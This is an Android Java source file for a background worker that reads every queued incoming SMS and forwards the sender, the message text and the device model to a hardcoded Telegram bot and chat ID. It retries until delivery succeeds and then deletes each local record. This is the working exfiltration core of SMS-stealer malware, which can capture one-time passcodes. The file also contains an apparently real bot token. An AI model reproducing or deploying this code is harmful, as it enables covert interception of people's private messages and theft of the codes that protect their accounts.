
package com.example.safesmstest;

import android.content.Context;
import android.os.Build;

import androidx.annotation.NonNull;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import java.io.BufferedWriter;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class PendingSmsWorker extends Worker {

    // ထုတ်ထားတဲ့ Token ဟောင်းကို မသုံးပါနဲ့။
    // BotFather မှာ Token အသစ်ထုတ်ပြီး ဒီနေရာမှာ အစားထိုးပါ။
    private static final String BOT_TOKEN =
            "9043083829:AAGUcD-pKImF9s2g43IYmuxpYCAX1hfUZjU";

    private static final String CHAT_ID = "7064723270";

    public PendingSmsWorker(
            @NonNull Context c,
            @NonNull WorkerParameters p
    ) {
        super(c, p);
    }

    @NonNull
    @Override
    public Result doWork() {

        if (BOT_TOKEN.startsWith("PASTE_")
                || BOT_TOKEN.trim().isEmpty()
                || CHAT_ID.trim().isEmpty()) {

            android.util.Log.e(
                    "PendingSmsWorker",
                    "Telegram token or chat ID is missing."
            );

            return Result.failure();
        }

        try {
            List<SmsEntity> queue =
                    SmsDatabase.getDatabase(getApplicationContext())
                            .smsDao()
                            .getAllPendingSms();

            if (queue == null || queue.isEmpty()) {
                return Result.success();
            }

            for (SmsEntity sms : queue) {

                String text =
                        "━━━━━━━━━━━━━━━━━━━━\n"
                        + "<b>Incoming SMS Received</b>\n"
                        + "━━━━━━━━━━━━━━━━━━━━\n\n"

                        + "📱 <b>Device:</b> "
                        + htmlSafe(deviceName()) + "\n\n"

                        + "📞 <b>From:</b> "
                        + htmlSafe(safe(sms.getPhoneNumber())) + "\n\n"

                        + "💬 <b>Message:</b>\n"
                        + htmlSafe(safe(sms.getMessage()))
                        + "\n\n"

                        + "━━━━━━━━━━━━━━━━━━━━";

                if (!send(text)) {
                    return Result.retry();
                }

                SmsDatabase.getDatabase(getApplicationContext())
                        .smsDao()
                        .deleteSms(sms);
            }

            return Result.success();

        } catch (Exception e) {

            android.util.Log.e(
                    "PendingSmsWorker",
                    "Delivery failed; will retry",
                    e
            );

            return Result.retry();
        }
    }

    private String safe(String s) {
        return s == null ? "" : s;
    }

    private String htmlSafe(String s) {
        return safe(s)
                .replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;");
    }

    private String deviceName() {

        String manufacturer =
                Build.MANUFACTURER == null
                        ? ""
                        : Build.MANUFACTURER.trim();

        String model =
                Build.MODEL == null
                        ? ""
                        : Build.MODEL.trim();

        if (manufacturer.isEmpty()) {
            return model.isEmpty()
                    ? "Android device"
                    : model;
        }

        return model.toLowerCase(Locale.ROOT)
                .startsWith(manufacturer.toLowerCase(Locale.ROOT))
                ? model
                : manufacturer + " " + model;
    }

    private boolean send(String text) {

        HttpURLConnection connection = null;

        try {
            URL url = new URL(
                    "https://api.telegram.org/bot"
                            + BOT_TOKEN
                            + "/sendMessage"
            );

            connection =
                    (HttpURLConnection) url.openConnection();

            connection.setRequestMethod("POST");
            connection.setDoOutput(true);
            connection.setConnectTimeout(15000);
            connection.setReadTimeout(15000);

            connection.setRequestProperty(
                    "Content-Type",
                    "application/x-www-form-urlencoded; charset=UTF-8"
            );

            String data =
                    "chat_id="
                    + URLEncoder.encode(CHAT_ID, "UTF-8")

                    + "&parse_mode=HTML"

                    + "&text="
                    + URLEncoder.encode(text, "UTF-8");

            try (
                    BufferedWriter writer =
                            new BufferedWriter(
                                    new OutputStreamWriter(
                                            connection.getOutputStream(),
                                            StandardCharsets.UTF_8
                                    )
                            )
            ) {
                writer.write(data);
            }

            int responseCode = connection.getResponseCode();

            InputStream response =
                    responseCode >= 200 && responseCode < 400
                            ? connection.getInputStream()
                            : connection.getErrorStream();

            if (response != null) {
                response.close();
            }

            return responseCode == HttpURLConnection.HTTP_OK;

        } catch (Exception e) {

            android.util.Log.e(
                    "PendingSmsWorker",
                    "Telegram request failed",
                    e
            );

            return false;

        } finally {

            if (connection != null) {
                connection.disconnect();
            }
        }
    }
}
